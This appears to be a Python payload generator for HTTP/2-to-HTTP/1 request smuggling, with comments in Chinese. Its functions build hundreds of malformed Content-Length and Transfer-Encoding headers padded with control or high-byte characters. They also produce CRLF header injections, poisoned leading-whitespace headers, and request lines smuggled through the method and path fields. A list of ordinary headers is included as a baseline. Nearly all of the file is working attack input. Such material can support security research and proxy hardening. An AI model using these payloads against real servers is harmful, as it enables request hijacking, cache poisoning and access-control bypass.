
# * content-length插入unicode(0x1-0x21)
def gen_cl1():
    cl1 = []
    for i in range(0x1,0x21):
        cl1.append(["content-length","%c1"%(i)]) 
        cl1.append(["content-length","1%c"%(i)])
        cl1.append(["content-length%c"%(i),"1"])
        cl1.append(["%ccontent-length"%(i),"1"])
     
        cl1.append(["X: X%ccontent-length"%(i),"1"])
        cl1.append(["content-length", "1%cX: X"%(i)])
        cl1.append(["X: X\r%ccontent-length"%(i),"1"])
        cl1.append(["X: X%c\ncontent-length"%(i), "1"])
        cl1.append(["content-length","1\r%cX: X"%(i)])
        cl1.append(["content-length", "1%c\nX: X"%(i)])

        cl1.append(["%ccontent-length%c"%(i,i), "1"])
        cl1.append(["%ccontent-length"%(i),"%c1"%(i)])
        cl1.append(["%ccontent-length"%(i),"1%c"%(i)])
        cl1.append(["content-length%c"%(i),"%c1"%(i)])
        cl1.append(["content-length%c"%(i), "1%c"%(i)])
        cl1.append(["content-length","%c1%c"%(i,i)])
        
        # "-"to"_"
        cl1.append(["content_length","%c1"%(i)]) 
        cl1.append(["content_length","1%c"%(i)])
        cl1.append(["content_length%c"%(i),"1"])
        cl1.append(["%ccontent_length"%(i),"1"])
     
        cl1.append(["X: X%ccontent_length"%(i),"1"])
        cl1.append(["content_length", "1%cX: X"%(i)])
        cl1.append(["X: X\r%ccontent_length"%(i),"1"])
        cl1.append(["X: X%c\ncontent_length"%(i), "1"])
        cl1.append(["content_length","1\r%cX: X"%(i)])
        cl1.append(["content_length", "1%c\nX: X"%(i)])

        cl1.append(["%ccontent_length%c"%(i,i), "1"])
        cl1.append(["%ccontent_length"%(i),"%c1"%(i)])
        cl1.append(["%ccontent_length"%(i),"1%c"%(i)])
        cl1.append(["content_length%c"%(i),"%c1"%(i)])
        cl1.append(["content_length%c"%(i), "1%c"%(i)])
        cl1.append(["content_length","%c1%c"%(i,i)])
    return cl1

# * content-length插入unicode(0x7F,0x100)
def gen_cl2():
    cl2 = []
    for i in range(0x7F,0x100):
        cl2.append(["content-length","%c1"%(i)]) 
        cl2.append(["content-length","1%c"%(i)])
        cl2.append(["content-length%c"%(i),"1"])
        cl2.append(["%ccontent-length"%(i),"1"])

        cl2.append(["X: X%ccontent-length"%(i),"1"])
        cl2.append(["content-length", "1%cX: X"%(i)])
        cl2.append(["X: X\r%ccontent-length"%(i),"1"])
        cl2.append(["X: X%c\ncontent-length"%(i), "1"])
        cl2.append(["content-length","1\r%cX: X"%(i)])
        cl2.append(["content-length", "1%c\nX: X"%(i)])

        cl2.append(["%ccontent-length%c"%(i,i), "1"])
        cl2.append(["%ccontent-length"%(i),"%c1"%(i)])
        cl2.append(["%ccontent-length"%(i),"1%c"%(i)])
        cl2.append(["content-length%c"%(i),"%c1"%(i)])
        cl2.append(["content-length%c"%(i), "1%c"%(i)])
        cl2.append(["content-length","%c1%c"%(i,i)])

        # "-"to"_"
        cl2.append(["content_length","%c1"%(i)]) 
        cl2.append(["content_length","1%c"%(i)])
        cl2.append(["content_length%c"%(i),"1"])
        cl2.append(["%ccontent_length"%(i),"1"])
     
        cl2.append(["X: X%ccontent_length"%(i),"1"])
        cl2.append(["content_length", "1%cX: X"%(i)])
        cl2.append(["X: X\r%ccontent_length"%(i),"1"])
        cl2.append(["X: X%c\ncontent_length"%(i), "1"])
        cl2.append(["content_length","1\r%cX: X"%(i)])
        cl2.append(["content_length", "1%c\nX: X"%(i)])

        cl2.append(["%ccontent_length%c"%(i,i), "1"])
        cl2.append(["%ccontent_length"%(i),"%c1"%(i)])
        cl2.append(["%ccontent_length"%(i),"1%c"%(i)])
        cl2.append(["content_length%c"%(i),"%c1"%(i)])
        cl2.append(["content_length%c"%(i), "1%c"%(i)])
        cl2.append(["content_length","%c1%c"%(i,i)])
    return cl2
def gen_cl3():
    cl3 = []
    cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u5b63\u0165"])
    # cl3.append(["user-agent","test\u005c\u0166"])
    # cl3.append(["user-agent","test\u005c\u0263"])
    # cl3.append(["user-agent","test\u005c\u0363"])
    # cl3.append(["user-agent","test\u005c\u0463"])
    # cl3.append(["user-agent","test\u005c\u0563"])
    # cl3.append(["user-agent","test\u005c\u1063"])
    # cl3.append(["user-agent","test\u005c\u1163"])
    # cl3.append(["user-agent","test\u005c\u1263"]) 
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])

    return cl3
# * Transfer-Encoding插入unicode(0x1-0x21)
def gen_te1():
    te1 = []
    for i in range(0x1,0x21):
        # cl1.append(["content-length","%c1"%(i)]) 
        te1.append(["%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding%c"%(i),"chunked"])
        te1.append(["Transfer-Encoding","%cchunked"%(i)])
        te1.append(["Transfer-Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding","%cchunked%c"%(i,i)])

        # "-"to"_"
        te1.append(["%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding%c"%(i),"chunked"])
        te1.append(["Transfer_Encoding","%cchunked"%(i)])
        te1.append(["Transfer_Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te1

# * Transfer-Encoding插入unicode(0x7F,0x100)
def gen_te2():
    te2 = []
    for i in range(0x7F,0x100):
        te2.append(["%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding%c"%(i),"chunked"])
        te2.append(["Transfer-Encoding","%cchunked"%(i)])
        te2.append(["Transfer-Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding","%cchunked%c"%(i,i)])
        # "-"to"_"

        te2.append(["%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding%c"%(i),"chunked"])
        te2.append(["Transfer_Encoding","%cchunked"%(i)])
        te2.append(["Transfer_Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te2

# *将"Transfer-Encoding: chunked"中的"s"替换为"\u017f"或"k"替换为"\u212a"
def gen_te3():
    te3=[]
    te3.append(["Tran\u017ffer-Encoding","chunked"])
    te3.append(["Transfer-Encoding","chun\u212aed"])
    te3.append(["Transfer-Encoding","chunked"])
    te3.append(["transfer-encoding","chunked"])
    return te3


        
# *在header value利用"\r\n" "\r" "\n"的插入header
# *有两种形式
# *一种直接插入"X:x" "X: x"
# *另一种插入"X:-00000000x" "X:000000x" "X: -00000000x" "X: 000000x"(不知道插入10个0有什么用但是http2smugl试了这种办法)
def gen_header_value_newline_inject_payload():
    header_value_newline_inject_list = [["foo","bar\r\nX:x"],["foo","bar\rX:x"],["foo","bar\nX:x"],
    ["foo","bar\r\nX: x"],["foo","bar\rX: x"],["foo","bar\nX: x"],
    ["foo","bar\r\nX:-00000000000x"],["foo","bar\rX:-00000000000x"],["foo","bar\nX:-00000000000x"],
    ["foo","bar\r\nX: -00000000000x"],["foo","bar\rX: -00000000000x"],["foo","bar\nX: -00000000000x"],
    ["foo","bar\r\nX:00000000000x"],["foo","bar\rX:00000000000x"],["foo","bar\nX:00000000000x"],
    ["foo","bar\r\nX: 00000000000x"],["foo","bar\rX: 00000000000x"],["foo","bar\nX: 00000000000x"]]
    return header_value_newline_inject_list

# *在header name利用"\r\n" "\r" "\n"的插入header
def gen_header_name_newline_inject_payload():
    header_name_newline_inject_list = [["X:x\r\nfoo","bar"],["X:x\rfoo","bar"],["X:x\nfoo","bar"],
                                    ["X: x\r\nfoo","bar"],["X: x\rfoo","bar"],["X: x\nfoo","bar"]]
    return header_name_newline_inject_list

# *header name带前空格的有毒header 转换成HTTP/1之后会折叠
def gen_poison_header_inject_payload():
    poison_header_list = [[" posion", "x"],["\x00posion", "x"],["\tposion", "x"], 
                          ["\vposion", "x"],["\u0085posion", "x"],["\u00A0posion", "x"],["\U000130BAposion", "x"]]
    return poison_header_list

# * 通过scheme字段注入url前缀
def gen_scheme_inject_payload():
    scheme_inject_list = ["http://a.example.com?", "https://a.example.com?"]
    return scheme_inject_list

# *通过method字段注入请求行
def gen_method_inject_payload():
    method_inject_list = ["GET / HTTP/1.1\r\nTransfer-encoding:chunked\r\nx:x","GET / HTTP/1.1\rTransfer-encoding:chunked\rx:x","GET / HTTP/1.1\nTransfer-encoding:chunked\nx:x",
                                                 "GET / HTTP/1.1\r\nTransfer-encoding: chunked\r\nx: x","GET / HTTP/1.1\rTransfer-encoding: chunked\rx: x","GET / HTTP/1.1\nTransfer-encoding: chunked\nx: x"]
    return method_inject_list

# *通过path字段注入请求行
def gen_path_inject_patload():
    path_inject_list = ["/ HTTP/1.1\r\nHost:127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx:x","/ HTTP/1.1\rHost:127.0.0.1\r\rGET / HTTP/1.1\rx:x","/ HTTP/1.1\nHost:127.0.0.1\n\nGET / HTTP/1.1\nx:x",
                        "/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx: x","/ HTTP/1.1\rHost: 127.0.0.1\r\rGET / HTTP/1.1\rx: x","/ HTTP/1.1\nHost: 127.0.0.1\n\nGET / HTTP/1.1\nx: x"]
    return path_inject_list

def gen_single_header():
    single_header_list = []

    accept_header =[["accept","text/html"],["accept","image/*"],["accept","text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8"]]
    accept_ch_header = [["Accept-CH", "DPR, Viewport-Width"],["Accept-CH", "Width"]]
    accept_charset_header = [["accept-charset","iso-8859-1"]]
    accept_encoding_header =[["accept-encoding", "gzip"], ["accept-encoding", "br;q=1.0, gzip;q=0.8, *;q=0.1"]]
    accept_language_header = [["accept-language","de"],["Accept-Language","de-CH"],["Accept-Language","en-US,en;q=0.5"],["Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"]]
    access_control_request_method_header = [["Access-Control-Request-Method", "POST"]]
    age_header = [["age", "24"]]
    allow_header = [["allow", "GET, POST, HEAD"]]
    cache_control_header = [[]]
    connection_header = [["connection", "keep-alive"],["connection", "close"]]
    content_encoding_header =[["Content-Encoding", "gzip"], ["Content-Encoding", "compress"],["Content-Encoding", "deflate"],["Content-Encoding", "br"],["AContent-Encoding", "gzip, compress, br"], ["Content-Encoding", "br;q=1.0, gzip;q=0.8, *;q=0.1"]]
    content_type_header = [["content-type","text/html;charset=utf-8"],["content-type", "multipart/form-data; boundary=something"]]
    device_memory_header = [["device-memory", "0.25"],["device-memory", "0.5"],["device-memory", "1"],["device-memory", '2'],["device-memory", "4"],["device-memory", "8"]]
    dnt_header = [["dnt", "0"], ["dnt","1"]]
    early_data_header = [["early-data", "1"]]
    except_header = [["Expect", "100-continue"]]
    from_header = [["from", 'linziyu0205@163.com']]
    host_header = [["host", '127.0.0.1']]
    if_match_header = [["if-match", "bfc13a64729c4290ef5b2c2730249c88ca92d82d"], ["if-match", 'W/"67ab43", "54ed21", "7892dd"'], ["if-match", "*"]]
    if_modified_since_header = [["if-modified-since", " Wed, 21 Oct 2015 07:28:00 GMT"]]
    if_none_match_header = [["if-none-match", "bfc13a64729c4290ef5b2c2730249c88ca92d82d"], ["if-none-match", 'W/"67ab43", "54ed21", "7892dd"'], ["if-none-match", "*"]]
    if_range_header = [["if-range", "Wed, 21 Oct 2015 07:28:00 GMT"]]
    if_unmodified_since_header = [["if-unmodified-since", "Wed, 21 Oct 2015 07:28:00 GMT"]]
    keep_alive_header = [["keep-alive", "timeout=5, max=1000"]]
    te_header = [["TE", "compress"],["TE", "deflate"],["TE", "gzip"],["TE", "trailers"],["TE", "trailers, deflate;q=0.5"]]
    transfer_encoding_header = [["Transfer-Encoding","chunked"],["Transfer-Encoding","compress"],["Transfer-Encoding","deflate"],["Transfer-Encoding","gzip"],["Transfer-Encoding","identity"],["Transfer-Encoding","gzip, chunked"]]
    upgrade_insecure_requests_header = [["upgrade-insecure-requests", "1"]]
    user_agent_header = [["user-agent","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"]]
    via_header = [["via", "1.1 vegur"],["via", "HTTP/1.1 GWA"],["via", "1.0 fred, 1.1 p.example.netr"]]
    want_digest_header = [["want-digest", "sha-256"],["want-digest", "SHA-512;q=0.3, sha-256;q=1, md5;q=0"]]
    sec_ch_prefers_reduced_motion_Header = [["Sec-CH-Prefers-Reduced-Motion", "reduce"]]
    max_forwards_header = [["max-forwards", "0"],["max-forwards", "10"]]
    orgin_header = [["Origin",  "http://127.0.0.1:80"]]
    range_header = [["range", "bytes=0-0"],["range", "bytes=-1"],["range", "bytes=0-0 & bytes=0-0"],["range", "bytes=0-,0-,"]]
    refer_header = [["refer", "http://127.0.0.1/index.html"]]
    save_data_header = [["save-data", "on"]]

    single_header_list.extend(accept_header)
    single_header_list.extend(accept_ch_header)
    single_header_list.extend(accept_charset_header)
    single_header_list.extend(accept_encoding_header)
    single_header_list.extend(accept_language_header)
    single_header_list.extend(access_control_request_method_header)
    single_header_list.extend(age_header)
    single_header_list.extend(allow_header)
    single_header_list.extend(connection_header)
    single_header_list.extend(content_encoding_header)
    single_header_list.extend(content_type_header)
    single_header_list.extend(device_memory_header)
    single_header_list.extend(dnt_header)
    single_header_list.extend(early_data_header)
    single_header_list.extend(except_header)
    single_header_list.extend(from_header)
    single_header_list.extend(host_header)
    single_header_list.extend(if_match_header)
    single_header_list.extend(if_modified_since_header)
    single_header_list.extend(if_none_match_header)
    single_header_list.extend(if_range_header)
    single_header_list.extend(if_unmodified_since_header)
    single_header_list.extend(keep_alive_header)
    single_header_list.extend(te_header)
    single_header_list.extend(transfer_encoding_header)
    single_header_list.extend(upgrade_insecure_requests_header)
    single_header_list.extend(user_agent_header)
    single_header_list.extend(via_header)
    single_header_list.extend(want_digest_header)
    single_header_list.extend(sec_ch_prefers_reduced_motion_Header)
    single_header_list.extend(max_forwards_header)
    single_header_list.extend(orgin_header)
    single_header_list.extend(range_header)
    single_header_list.extend(refer_header)
    single_header_list.extend(save_data_header)
 
    return single_header_list

# accept_header =[["accept","text/html"],["accept","image/*"]["accept","text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8"]]


